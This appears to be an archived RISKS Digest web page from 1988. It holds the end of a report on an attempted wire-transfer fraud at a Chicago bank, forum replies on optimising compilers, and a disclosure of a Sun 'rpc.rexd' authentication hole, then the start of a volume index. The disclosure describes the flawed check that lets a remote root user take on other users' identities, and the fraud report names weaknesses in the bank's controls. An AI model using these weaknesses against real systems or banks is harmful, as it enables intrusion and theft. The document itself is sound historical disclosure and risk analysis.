that not only are the dialed digits recorded, *but the conversations are
also*. They also did not realize that due to the size of the Merrill Lynch
account, one employee at First National is assigned full time to handle only
that account and attend to the needs of that very large customer. On coming
to work Monday morning, the first thing that person did was review the
latest printout for the customer. The overdraft was immediately noted, and
since no other employee at the bank is ever authorized to debit or credit
the customer's account or do maintenance on the account, it stood out like
the proverbial sore thumb. A call to the responsible party at Merrill Lynch
confirmed that they had not requested a transfer either.

Bank employees who wish to remain anonymous said it was naive to assume
the large overdrafts would not be noticed in a matter of hours. "It's the
greed that killed them," said one bank executive.

It's not really clear why the money was not moved out of the United States
to the banks in Vienna on Friday rather than waiting for Monday. Although
the bank executive said the schemers were stupid about the whole thing, he
admitted there were flaws in First National's system also. He said Taylor
should not have been able to know for sure that he would be the employee
to make the 'confirming phone call'. The person in the wire room who
handles the confirmation should be selected at random just like the person
who receives the call in the first place. The person actually doing the
transfer should likewise be selected at random. By making it predictable
to either party, a scam is that much easier.

The scheme would have eventually foundered anyway. You don't just withdraw $70
million from a bank in Austria without pretty thorough feedback and checking.

ABOUT THE DEFENDANTS - Gabriel Moore and Otis Wilson apparently had no prior
criminal background. Both have elected to cooperate with the government in the
prosecution of Armand Moore, a several times convicted con man. Both are free
on recognizance bond pending their own trials. While its hard to feel sympathy
for them, I *do* feel a twinge of sympathy. Both were (probably) very poorly
paid clerks. They saw billions of dollars pass through their hands daily. When
an older man, suave and sophisticated, takes them out to dinner, hovers over
them, showers them with attention and offers to help them achieve the kind of
riches they and their families could never legitimately have, it was too much
temptation for them to resist. Wouldn't *you* find it hard? I know I would....
In all probability, based on the sentencing guidelines in federal court here,
when they are tried, based on their pleas of guilt, the court will find them
guilty. The government will make no recommendation as to appropriate
punishment, and they will receive federal probation, probably for two to four
years.

Obviously, they are blackballed from any further employment in banking/credit
card/other financial operations. They face their families and friends as
convicted felons.

If Armand Moore and his other associates -- the people who would have actually
benefitted from the scheme (you don't *really* think they planned to cut those
two kids in on it if they could help it, do you?) -- are convicted, most likely
they will face hard time.

A curious dilemma arose regarding $19.8 million transferred to Citibank that
Friday morning. *Citibank refused at first to give it back*. According to
Citibank, all regulations regarding wire transfers were followed. The proper
things were done, the proper words and phrases uttered, all was in order.
Why, they asked, should *we* have to handle security at First National? They
argued that wire transfers were intended to be immediate credits, and that
if First National was now saying in effect that under some conditions their
word on wires was not good, then why bother with a wire?

First National responded by filing suit the same day, Monday, May 16 in court
in New York City, demanding that their money be returned to them. After some
negotiations between Citibank and First National, *most* of the $19.8 million
was returned. Citibank now says apparently they had better stop accepting wire
transfers from First National altogether, or at least subject them to normal
clearing procedures, for you never know when First National might come back a
few hours -- or a weekend -- later and say it was in error.

Internal controls at First National have been so poor in recent years that in
fact a lot of smaller banks throughout the country have begun holding their
paper for clearance -- even cashier's checks and drafts -- simply because when
'errors' have occurred in the past, First National has taken what is percieved
by many banks as a very uppity attitude toward investigation and restitution.

Mr. Edwards of Hagerstown called it 'sheer happenstance that it failed.' I
think I agree.

Patrick Townson@cup.portal.com, PO Box 1003, Chicago, IL 60690-1003

(ps: Hinsdale seems to be rehabilitated - finally - as of the past few days!
Rumors of terrorist activity/arson at the switch are totally unfounded.)

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
   Re: Optimisers too tacit, perhaps?
</A>
</H3>
<address>
Tim McDaniel
&lt;<A HREF="mailto:mcdaniel%uicsrd.csrd.uiuc.edu%uxc.cso.uiuc.edu@uxc.cso.uiuc.edu ">
mcdaniel%uicsrd.csrd.uiuc.edu%uxc.cso.uiuc.edu@uxc.cso.uiuc.edu 
</A>&gt;
</address>
<i>
Wed, 1 Jun 88 12:23:33 CDT
</i><PRE>

&gt;Does anyone wish optimisers were more forthcoming about the changes they make?

In general, I agree with your point.  For example, some source-to-source
parallelizing compilers can simply list their output; the output language is
the input language, and often you can tell what input generated what output.

However, there are two possible pitfalls.  One RISK is that if a compiler
always puts out reams of messages, a user comes to ignore them, and may not
notice the important ones.

Another problem is that super-optimizers super-mangle code.  A change made
by a super-optimizers after many passes may have little or no relation to
the original source, and so a message may be totally inappropriate.

As one (possibly poor) example, consider the job of doing subscript checking
in Pascal.  Suppose that you already have a very good flow-analysis pass in
your compiler.  The straightforward approach would be to change
	var a, b: array [0 .. 10] of integer;
		i: 0 .. 255;
	...
	a[i] := b[i];
into
	if (i &lt; 0 or i &gt; 10) then
		abort(some message about a);
	if (i &lt; 0 or i &gt; 10) then
		abort(some message about b);
	a[i] := b[i];

I say ``straightforward'' because these statements can be generated
mechanically, yet it can be easily improved (if you have the good pass as
above).  A super-optimizer could remove the second ``if'', knowing that
there is no return from abort and hence no path in which i is out-of-bound
can reach the second ``if''.  It could notice that ``i'' is non-negative and
remove ``i &lt; 0 or''.  If the original statement were enclosed in
	for i := 0 to 10 do begin ... end
(a common case for arrays) then it could remove all the subscript-checking code.

The alternative would be to special-case the subscript-checking pass to
insert the checks only when necessary.  That would be far more error-prone
and more specialized.

(There are many other optimizations that introduce dead code; see your local
Dragon book.  In fact, because users rarely write dead code,
dead-code-elimination passes exist to clean up after the compiler itself.)

Alas, designing proper messages controlled by reasonable compiler options is
not an easy task.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Optimisers; Telecommunications Redundancy (Risks 6.94)
</A>
</H3>
<address>
Michael Wagner +49 228 8199645       
&lt;<A HREF="mailto:WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU">
WAGNER%DBNGMD21.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Wed, 01 Jun 88 12:20
</i><PRE>

In Risks 6.94, J M Hicks &lt;cudat@CU.WARWICK.AC.UK&gt; asked:
&gt;Does anyone wish optimisers were more forthcoming about the changes they make?

Yes, and for this reason, I've always liked the IBM translators, and
particularly the PL/I optimising compiler.  PL/I told you (as a
warning-level message) when it detected and deleted unreachable code.  PL/I
also gave you a complete attribute and cross-reference list, marking the
difference between reference and assignment.  These are features I really
miss in the C compilers I use now (including the IBM one, strangely).

I have had a number of philosophical discussions with people who feel that
such functionality (a) does not belong in a timesharing or micro environment
(because it produces long 'listings') and (b) does not belong in the
compiler.  While there might be a use for a tool that reads the defined
reference language and produces such information (like LINT and XREF), I
find it very useful when the compiler itself tells me.  Amongst other
things, it is reassuring me that it has the same understanding of the source
code as I (and perhaps the reference language) have.

In the same issue, Klaus Brunnstein wrote:
&gt; When analysing the missing redundancy in the ... `Deutsche
&gt; Bundes-Post', ...
&gt; our DATEX-P network has only one central communications controller
&gt; per area. ... Despite many discussions and arguments ...  the Post
&gt; office managers argue that today, redundancy does not pay

To make this a little more concrete, here in Bonn, the central switch is in
a little building on the banks of the Rhine.  For a variety of reasons, the
Rhine floods every year.  The last two years have been particularly bad.
Both Datex-P traffic and voice traffic in Bonn was badly hampered for days
this year because of minimal redundancy.  Nothing was done after last years
flood, and I sincerely doubt that anything is being done about it now.

Michael

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Major security hole in some sun systems
</A>
</H3>
<address>
Jim Purtilo
&lt;<A HREF="mailto:purtilo@flubber.cs.umd.edu ">
purtilo@flubber.cs.umd.edu 
</A>&gt;
</address>
<i>
Wed, 1 Jun 88 13:07:19 EDT
</i><PRE>

We at UMCP have just discovered (the hard way) that there is a major
security hole in a program called "rpc.rexd" on sun workstations.  This
program is intended to facilitate a form of remote execution between
appropriate workstations; the front-end program which is used to request the
remote execution is called simply "on".  Unfortunately, "rpc.rexd" fails
(miserably) in its check of whether the requesters should have the
permission to do what they ask for.

Because of the way on/rexd works, anyone who wishes can, given root access
to his own machine, become any uid he wants on any other machine running rex
*anywhere on the Internet*.  (Luckily, root appears to be the only exception
to this rule, if that is some small consolation.)  The authentication test
in the Sun3.2 rex daemon appears to proceed as:

	get the remote user id out of Unix-flavored authentication
	if it's zero, then deny access
	if getpwuid(remoteuid) is not NULL
		then grant access
		else deny access

In other words, any non-zero user identifier which happens to correspond to
a valid user on the target machine can be used to gain the privileges of
that user.  There is no check to see whether that user has granted "trusted"
status to the originating user and host (normally done via a file called
".rhosts" in many networked Unix systems), nor is there any check to see
whether a system administrator has generically granted such a trusted status
to the originating machine.

If you're running rexd and you're connected to a network, and if there are
people or places on your net whom you don't trust, then we suggest not
running rexd.  To see if you are running it now, look in your /etc/servers
table.  If the "rpc.rexd" line is missing or commented out, you're OK.  Sun
does not enable this daemon in the /etc/servers you read off the
installation tapes.

There are several ways that this problem seems relevent to the risks forum.
The most obvious is the risk of blindly trusting a vendor to ship you
software that performs at least `reasonable' security checks.  We will not
belabor that point here.  Instead, we provide yet another testimony to how
closely we must all watch what goes on our machines:  innocent intentions
can still lead to big headaches.  Most of the Suns in our network ran
version 3.0 of the Sun OS, served by a large central fileserver.  Rex
daemons were not readily available for this version, and there was no hole.
However, many individual research groups have suns of their own.  One day, a
guru running one of these individual Suns decided to be the first on his
block to upgrade to release 3.2.  He was not a staff member in our
department, but was in fact trusted with superuser access to the fileserver.
A well-intentioned chap, as he upgraded his owner's machine, he also
installed the new, cute looking goodies from the distribution on the
department fileserver so that all might benefit from his efforts.  Hence,
the normal scrutiny we would subject a new piece of software to was
bypassed.  Whether or not we would have found the hole when doing our normal
installation of this software is unclear, to be sure, but we would at least
liked to have had a shot at finding it.  You can only speculate at where we
have hidden the body of the late, otherwise well-intentioned, guru who
installed the rex daemon.

	Pete Cottrell, 	Steve Miller,	Jim Purtilo,	Chris Torek

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-51</DOCNO>
<DOCOLDNO>IA012-000131-B036-292</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/9/index.html 128.240.150.127 19970217024716 text/html 88458
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:45:24 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Index to Volume 9</TITLE>
<LINK REL="Pref" HREF="/Risks/8/index.html">
<LINK REL="Next" HREF="/Risks/10/index.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8/index.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/10/index.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Index to Volume 9</H1>
<H2> Wednesday 30 May 1990  </H2>
<H3>Forum on Risks to the Public in Computers and Related Systems</H3>
<I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------">
<DL>
<DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.1.html">Volume 9 Issue 1 (6 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.1.html#subj1">  Elevator inquest update (Walter Roberson)</A>
<LI><A HREF="/Risks/9.1.html#subj2">  UK Defense software standard (Sean Matthews)</A>
<LI><A HREF="/Risks/9.1.html#subj3">  Exxon loses Valdez data (Steve Smaha -- and Hugh Miller)</A>
<LI><A HREF="/Risks/9.1.html#subj4">  "Managing risk in large complex systems" (Bob Allison)</A>
<LI><A HREF="/Risks/9.1.html#subj5">  A "model" software engineering methodology? (Rich D'Ippolito)</A>
<LI><A HREF="/Risks/9.1.html#subj6">  CERT Offline (Edward DeHart)</A>
<LI><A HREF="/Risks/9.1.html#subj7">  Re: Audi 5000 acceleration (Dave Platt, Mark Seecof, Michael McClary)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.2.html">Volume 9 Issue 2 (10 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.2.html#subj1">  Re: A "model" software engineering methodology?     (PGN, Stan Shebs, Victor Yodaiken, Dave Davis, Gideon Yuval, Jon Loux)
</A>
<LI><A HREF="/Risks/9.2.html#subj2">  Re: UK Defence Software Standard (Eugene Miya, Joshua Levy, Norm Finn))</A>
<LI><A HREF="/Risks/9.2.html#subj3">  Exxon file deletions (Anonymous)</A>
<LI><A HREF="/Risks/9.2.html#subj4">  Stalking the wary food shopper (David Gursky)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.3.html">Volume 9 Issue 3 (11 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.3.html#subj1">  Re: UK Defense Software Standard (Nancy Leveson)</A>
<LI><A HREF="/Risks/9.3.html#subj2">  Errors in weapon software (Jon Jacky)</A>
<LI><A HREF="/Risks/9.3.html#subj3">  Where does safety lie? (Jennifer S Turney)</A>
<LI><A HREF="/Risks/9.3.html#subj4">  SP Cajon crash (Mike Trout)</A>
<LI><A HREF="/Risks/9.3.html#subj5">  Re: Stalking the wary food shopper (Steven Den Beste, David Gursky, asente)</A>
<LI><A HREF="/Risks/9.3.html#subj6">  ORAIS'89 Conference Program (Klaus Brunnstein)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.4.html">Volume 9 Issue 4 (13 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.4.html#subj1">  Air Traffic Computer Fails 104 Times in a Day (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.4.html#subj2">  A320/MD-11 F-B-W differ on pilot authority (Mark Seecof, Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.4.html#subj3">  UK MoD S/W Std -- "Crystal Clock" Architecture (Bob Munck)</A>
<LI><A HREF="/Risks/9.4.html#subj4">  A Biological Virus Risk (Frank Houston)</A>
<LI><A HREF="/Risks/9.4.html#subj5">  Software engineering models -- an apology (Rich D'Ippolito)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.5.html">Volume 9 Issue 5 (15 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.5.html#subj1">  UK Defence Software Standard (Dave Parnas, Nancy Leveson, Dave Parnas)</A>
<LI><A HREF="/Risks/9.5.html#subj2">  DARPA contract: use AI to select targets during nuclear war (Jon Jacky)</A>
<LI><A HREF="/Risks/9.5.html#subj3">  "Flying the Electric Skies" (Steve Philipson)</A>
<LI><A HREF="/Risks/9.5.html#subj4">  Automobile Electronic Performance management (Pete Lucas)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.6.html">Volume 9 Issue 6 (18 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.6.html#subj1">  Mitnick sentenced as an addict (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.6.html#subj2">  Long addresses confuse bank's computer (Paul Leyland)</A>
<LI><A HREF="/Risks/9.6.html#subj3">  Town Hall's computer snags trouble old age pensioners (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.6.html#subj4">  Re: Automobile Electronic Performance Management (Charles Rader)</A>
<LI><A HREF="/Risks/9.6.html#subj5">  Re: UK Defence Software Standard, non-determinism, recursion and armageddon    (Victor Yodaiken, anonymous via Tim Shimeall, Bob Estell, Martin Minow)
</A>
<LI><A HREF="/Risks/9.6.html#subj6">  Telephone technicians tapping into other phone lines (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.6.html#subj7">  Re: New Yorker Article on "radiation" risks (Gordon Hester)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.7.html">Volume 9 Issue 7 (19 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.7.html#subj1">  Re: Gordon Hester on Paul Brodeur (Radiation) (Jan Wolitzky)</A>
<LI><A HREF="/Risks/9.7.html#subj2">  Computers consume wine (Hugh Davies)</A>
<LI><A HREF="/Risks/9.7.html#subj3">  Mitnick sentence (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.7.html#subj4">  Re: DARPA contract: use AI to select targets during nuclear war (Lee Naish)</A>
<LI><A HREF="/Risks/9.7.html#subj5">  Reliance on technology (Jake Livni)</A>
<LI><A HREF="/Risks/9.7.html#subj6">  Summer slowdown for RISKS (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.8.html">Volume 9 Issue 8 (28 Jul 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.8.html#subj1">  Returning before departing on airline reservation systems (Gary McClelland)</A>
<LI><A HREF="/Risks/9.8.html#subj2">  Sun security problem: restore (J. Paul Holbrook)</A>
<LI><A HREF="/Risks/9.8.html#subj3">  Computer condom? (Jeff Stout)</A>
<LI><A HREF="/Risks/9.8.html#subj4">  Robert Tappan Morris indicted (Steve Den Beste)</A>
<LI><A HREF="/Risks/9.8.html#subj5">  Re: UK Defence Software Standard (Mark Moraes, Douglas W. Jones)</A>
<LI><A HREF="/Risks/9.8.html#subj6">  Polling vs. interrupts (Douglas W. Jones)</A>
<LI><A HREF="/Risks/9.8.html#subj7">  Software Engineering Models (John (J.G.) Mainwaring)</A>
<LI><A HREF="/Risks/9.8.html#subj8">  Single Point of Failure for Internet Management (Kee Hinckley)</A>
<LI><A HREF="/Risks/9.8.html#subj9">  DARPA contract &amp; AI for moving targets (Bob Estell)</A>
<LI><A HREF="/Risks/9.8.html#subj10">  Two-Word Last Names and Other Amusing Database Stories (Gary McClelland)</A>
<LI><A HREF="/Risks/9.8.html#subj11">  Credit card issuers invade cardholders' privacy (Andrew Klossner)</A>
<LI><A HREF="/Risks/9.8.html#subj12">  Re: windowless cockpits (Andrew Klossner)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.9.html">Volume 9 Issue 9 (14 Aug 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.9.html#subj1">  California to escrow electronic vote counting software (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.9.html#subj2">  Voters Left off Electoral Roll (Rohan Allan Baxter)</A>
<LI><A HREF="/Risks/9.9.html#subj3">  Beeperless remote answering machine risks (Peter Scott)</A>
<LI><A HREF="/Risks/9.9.html#subj4">  Computerized Houses (Jake Livni)</A>
<LI><A HREF="/Risks/9.9.html#subj5">  Automated Driving (Ian Gent)</A>
<LI><A HREF="/Risks/9.9.html#subj6">  Marijuana Virus wreaks havoc in Australian Defence Department (J. Holley)</A>
<LI><A HREF="/Risks/9.9.html#subj7">  Universal Trapdoors (Vin McLellan)</A>
<LI><A HREF="/Risks/9.9.html#subj8">  Computer Problems at Saratoga Racetrack (Rodney Hoffman, Dave Fiske)</A>
<LI><A HREF="/Risks/9.9.html#subj9">  RISKS summer reruns? (Daniel F. Fisher, Jim Horning)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.10.html">Volume 9 Issue 10 (14 Aug 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.10.html#subj1">  KAL007 - jury finds "willful misconduct" (Clifford Johnson)</A>
<LI><A HREF="/Risks/9.10.html#subj2">  California studies "drive-by-wire" (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.10.html#subj3">  NY State DMV Computer RISKS (Will Martin)</A>
<LI><A HREF="/Risks/9.10.html#subj4">  RISKS is back in gear (almost) (PGN)</A>
<LI><A HREF="/Risks/9.10.html#subj5">  "Radiation" or "Fields" (Jerry Leichter, Irving Wolfe, John H. Martin,     Irving L. Chidsey, Klaus Rieckhoff)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.11.html">Volume 9 Issue 11 (15 Aug 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.11.html#subj1">  Cellular Telephone Causes Airliner Fire Alarm (Dave Davis)</A>
<LI><A HREF="/Risks/9.11.html#subj2">  Computer-based airline ticket scam (Rodney Hoffman)</A>
<LI><A HREF="/Risks/9.11.html#subj3">  New Yorker Article on EMF Risks (Gordon Hester, Dan Schlitt)</A>
<LI><A HREF="/Risks/9.11.html#subj4">  1989 CPSR Annual Meeting (Gary Chapman)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.12.html">Volume 9 Issue 12 (17 Aug 89 )</A>
<DD><UL>
<LI><A HREF="/Risks/9.12.html#subj1">  RISKS IS FINALLY MOVING TO CSL.SRI.COM! (PGN)</A>
<LI><A HREF="/Risks/9.12.html#subj2">  Flaws in calculations, computer models in Trident failures (Jon Jacky)</A>
<LI><A HREF="/Risks/9.12.html#subj3">  Voyager 2 software faults at launch, 1977 Aug 20 10:29 (David B. Benson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.13.html">Volume 9 Issue 13 (18 Aug 89)</A>
<DD><UL>
<LI><A HREF="/Risks/9.13.html#subj1">  Phony IRS refunds by computer (Rob Gross)</A>
<LI><A HREF="/Risks/9.13.html#subj2">  Cellular phones in stings (David Wittenberg)</A>
<LI><A HREF="/Risks/9.13.html#subj3">  Aircrew acceptance of flight automation (Robert Dorsett)</A>
<LI><A HREF="/Risks/9.13.html#subj4">  Unauthorized Internet activity (CERT Internet Advisory -- Kenneth R. van Wyk)</A>
<LI><A HREF="/Risks/9.13.html#subj5">  Re: Marijuana virus wreaks havoc in Australian Defence Department    (Anthony John Apted)
</A>
<LI><A HREF="/Risks/9.13.html#subj6">  More on the Wily Hackers (Rob Gross)</A>
<LI><A HREF="/Risks/9.13.html#subj7">  Training and Software Engineers (Tim Shimeall)</A>
<LI><A HREF="/Risks/9.13.html#subj8">  Computer-based airline ticket scam (Jordan Brown)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.14.html">Volume 9 Issue 14 (21 Aug 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.14.html#subj1">  The Check's in the Mail (but the water got shut off anyway) (Dave Clayton)</A>
<LI><A HREF="/Risks/9.14.html#subj2">  Australian Commonwealth Bank -- doubled deposits (Martyn Thomas)</A>
<LI><A HREF="/Risks/9.14.html#subj3">  Automatic vehicle navigation systems (Pete Lucas)</A>
<LI><A HREF="/Risks/9.14.html#subj4">  Tired of computers being trusted? (a balancing act for wheel watchers) (PGN)</A>
<LI><A HREF="/Risks/9.14.html#subj5">  Re: Computer-based airline ticket scam (Jules d'Entremont)</A>
<LI><A HREF="/Risks/9.14.html#subj6">  Human failures in emergencies (Henry Spencer)</A>
<LI><A HREF="/Risks/9.14.html#subj7">  Hazards of Airliner Computerization (Mike Trout)</A>
<LI><A HREF="/Risks/9.14.html#subj8">  Re: California studies "drive-by-wire" (John Chew)</A>
<LI><A HREF="/Risks/9.14.html#subj9">  First test for electronic tagging starts in jail! (Olivier Crepin-Leblond)</A>
<LI><A HREF="/Risks/9.14.html#subj10">  Re: unauthorized Internet activity (anonymous)</A>
<LI><A HREF="/Risks/9.14.html#subj11">  DEMO Software Disk Infected (Jerusalem Version B) (J. Vavrina)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.15.html">Volume 9 Issue 15 (22 Aug 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.15.html#subj1">  Toronto Stock Exchange down for 3 hours, disk failures (Peter Roosen-Runge)</A>
<LI><A HREF="/Risks/9.15.html#subj2">  Automated highways ...    (Jerry Leichter, Bill Gorman, Peter Jones, Emily H. Lonsford, Bill Murray)
</A>
<LI><A HREF="/Risks/9.15.html#subj3">  Constructive criticism? Technology doesn't have to be bad (Don Norman)</A>
<LI><A HREF="/Risks/9.15.html#subj4">  Computer Ethics (Perry Morrison)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.16.html">Volume 9 Issue 16 (23 Aug 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.16.html#subj1">  Autopilots (Marc Rotenberg)</A>
<LI><A HREF="/Risks/9.16.html#subj2">  Hazards of Airliner Computerization (Brinton Cooper)</A>
<LI><A HREF="/Risks/9.16.html#subj3">  Risks, and an assumed definition of "reliability" (Bob Estell)</A>
<LI><A HREF="/Risks/9.16.html#subj4">  Computers in Medicine (Brinton Cooper)</A>
<LI><A HREF="/Risks/9.16.html#subj5">  Constructive criticism? Technology doesn't have to be bad (Donald A Norman)</A>
<LI><A HREF="/Risks/9.16.html#subj6">  Tandem computers and stock exchange failure (Ernest H. Robl)</A>
<LI><A HREF="/Risks/9.16.html#subj7">  TSE shutdown -- a success story (Rich D'Ippolito)</A>
<LI><A HREF="/Risks/9.16.html#subj8">  Incompatible IR controllers damage circuits? (David A Willcox)</A>
<LI><A HREF="/Risks/9.16.html#subj9">  Re: a balancing act for wheel watchers (J. Eric Townsend,  Keith D Gregory)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.17.html">Volume 9 Issue 17 (23 Aug 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.17.html#subj1">  Hazards in Airliners and Medicine (Nancy Leveson)</A>
<LI><A HREF="/Risks/9.17.html#subj2">  Re: Technology Doesn't Have to Be Bad (Mike Trout, Robert Dorsett)</A>
<LI><A HREF="/Risks/9.17.html#subj3">  "Drive-by-wire": What about bicycles? (Anne Paulson, Donald A Norman)</A>
<LI><A HREF="/Risks/9.17.html#subj4">  Re: Autopilots (Brinton Cooper)</A>
<LI><A HREF="/Risks/9.17.html#subj5">  Re: Automated Highways (George H. Feil)</A>
<LI><A HREF="/Risks/9.17.html#subj6">  Roads made safer or not? (Pete Lucas)</A>
<LI><A HREF="/Risks/9.17.html#subj7">  Training &amp; Software Engineering, a reply... (Edward A. Ranzenbach)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.18.html">Volume 9 Issue 18 (28 Aug 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.18.html#subj1">  Proposal for SDI software center (Gary Chapman)</A>
<LI><A HREF="/Risks/9.18.html#subj2">  Computerworld article on high-tech weapons (George Entenman)</A>
<LI><A HREF="/Risks/9.18.html#subj3">  CHAOSNet used in `SNUFF' snuff (PGN)</A>
<LI><A HREF="/Risks/9.18.html#subj4">  DMV records, and individual privacy and safety (PGN)</A>
<LI><A HREF="/Risks/9.18.html#subj5">  Another vehicle guidance system (Pete Lucas)</A>
<LI><A HREF="/Risks/9.18.html#subj6">  Medics touch computers?!? (Sam Bassett)</A>
<LI><A HREF="/Risks/9.18.html#subj7">  Unfounded fault-probability claims (Dieter Muller)</A>
<LI><A HREF="/Risks/9.18.html#subj8">  Lowest-bidder or weak specs? (David A Honig)</A>
<LI><A HREF="/Risks/9.18.html#subj9">  Automated roads, drive-by-wire, bicycles, and the elderly (PGN)</A>
<LI><A HREF="/Risks/9.18.html#subj10">  The Guardian vs computer passwords (Brian Foster)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/9.19.html">Volume 9 Issue 19 (30 Aug 1989)</A>
<DD><UL>
<LI><A HREF="/Risks/9.19.html#subj1">  NEW INSTRUCTIONS TO FTP VOL i ISSUE j, effective immediately (PGN)</A>
